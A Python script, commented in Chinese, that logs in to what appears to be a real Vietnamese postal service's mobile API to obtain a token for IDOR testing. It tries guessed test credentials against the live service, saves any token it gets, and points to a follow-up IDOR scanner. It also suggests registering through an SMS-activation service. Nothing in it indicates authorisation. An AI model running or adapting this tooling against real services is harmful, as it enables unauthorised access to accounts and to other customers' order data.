#!/usr/bin/env python3
"""
获取移动端Token - 用于IDOR测试
"""

import requests
import json

class EMSMobileLogin:
    def __init__(self):
        self.base_url = "http://ws.ems.com.vn"
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'EMSPortal/1.1.5 (Android)',
            'Content-Type': 'application/json',
        })
    
    def login(self, phone, password):
        """登录获取Token"""
        print(f"\n[*] 尝试登录...")
        print(f"    手机: {phone}")
        print(f"    密码: {'*' * len(password)}")
        
        data = {
            'phone': phone,
            'password': password,
            'device_id': 'test_device_001'
        }
        
        r = self.session.post(
            f"{self.base_url}/auth/login",
            json=data,
            timeout=10
        )
        
        print(f"\n[*] 状态码: {r.status_code}")
        
        if r.status_code == 200:
            try:
                resp = r.json()
                print(f"[*] 响应: {json.dumps(resp, indent=2, ensure_ascii=False)}")
                
                if resp.get('code') == 'success':
                    token = resp.get('data', {}).get('token')
                    
                    if token:
                        print(f"\n[+] ✓✓✓ 登录成功!")
                        print(f"[+] Token: {token}")
                        
                        # 保存Token
                        with open('/workspace/mobile_token.txt', 'w') as f:
                            f.write(f"Token: {token}\n")
                            f.write(f"Phone: {phone}\n")
                            f.write(f"BaseURL: {self.base_url}\n")
                        
                        print(f"[+] Token已保存到 mobile_token.txt")
                        
                        return token
                    else:
                        print(f"[!] 响应中没有token")
                
                else:
                    print(f"[!] 登录失败: {resp.get('message')}")
            
            except Exception as e:
                print(f"[!] 解析错误: {str(e)}")
                print(f"    响应: {r.text[:300]}")
        
        else:
            print(f"[!] 请求失败")
            print(f"    响应: {r.text[:300]}")
        
        return None
    
    def test_token(self, token):
        """测试Token有效性"""
        print(f"\n[*] 测试Token有效性...")
        
        headers = {
            'Authorization': f'Bearer {token}'
        }
        
        # 测试订单列表
        r = self.session.get(
            f"{self.base_url}/api/v1/orders/list",
            headers=headers,
            params={'page': 1},
            timeout=10
        )
        
        print(f"[*] 状态码: {r.status_code}")
        
        if r.status_code == 200:
            try:
                data = r.json()
                
                if data.get('code') == 'success':
                    print(f"[+] ✓ Token有效!")
                    
                    orders = data.get('data', [])
                    print(f"[+] 订单数: {len(orders)}")
                    
                    return True
                
                else:
                    print(f"[!] Token无效: {data.get('message')}")
            
            except:
                pass
        
        return False

def main():
    print("="*60)
    print(" EMS移动端登录 - 获取Token")
    print("="*60)
    
    login = EMSMobileLogin()
    
    print("\n[!] 需要有效的移动端账号")
    print("")
    print("[选项1] 如果你有账号:")
    print("  phone = input('手机号: ')")
    print("  password = input('密码: ')")
    print("  token = login.login(phone, password)")
    print("")
    print("[选项2] 使用测试账号 (如果存在):")
    
    # 尝试测试账号
    test_accounts = [
        ("0901234567", "123456"),
        ("0909999999", "test123"),
    ]
    
    print("\n[*] 尝试测试账号...")
    
    for phone, password in test_accounts:
        token = login.login(phone, password)
        
        if token:
            # 测试Token
            if login.test_token(token):
                print(f"\n[+] ✓✓✓ 可以使用此Token测试IDOR!")
                print(f"\n[下一步]")
                print(f"  python3 tracking_scanner.py --token {token[:30]}...")
                break
        
        print("")
    
    else:
        print(f"\n[!] 未找到有效的测试账号")
        print(f"\n[需要注册]")
        print(f"  1. 下载EMS Portal APP")
        print(f"  2. 使用越南手机号注册")
        print(f"  3. 或使用接码平台: sms-activate.org")
        print(f"  4. 注册后运行此脚本登录")

if __name__ == '__main__':
    main()
